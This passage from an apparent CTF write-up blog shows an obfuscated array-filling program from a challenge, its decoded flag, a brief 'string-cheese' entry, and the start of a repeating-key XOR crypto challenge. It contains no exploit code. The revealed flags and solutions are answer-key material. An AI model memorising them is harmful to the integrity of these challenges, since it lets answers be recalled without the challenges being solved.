function_">fill</span>(<span class="hljs-number">0</span>)<br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/12.png"><br>转一下就是flag<br><code>lactf&#123;th3_hungry_l1ttl3_c4t3rp1ll4r_at3_th3_fl4g_4g41n&#125;</code></p><h3 id="string-cheese"><a href="#string-cheese" class="headerlink" title="string-cheese"></a>string-cheese</h3><h4 id="题目说明-7"><a href="#题目说明-7" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼顶针的题 比赛的时候没看tnnd<br><img src="/mdimg/lactf/13.png"><br><img src="/mdimg/lactf/14.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="one-more-time-pad"><a href="#one-more-time-pad" class="headerlink" title="one-more-time-pad"></a><strong>one-more-time-pad</strong></h3><h4 id="题目说明-8"><a href="#题目说明-8" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard the onetime pad is perfectly secure so I used it to send an important message to a friend, but now a UCLA competition is asking for the key? I threw that out a long time ago! Can you help me recover it?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> cycle<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br><br>key = cycle(<span class="hljs-string">b&quot;lactf&#123;??????????????&#125;&quot;</span>)<br><br>ct = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(pt)):<br>    b = (pt[i] ^ <span 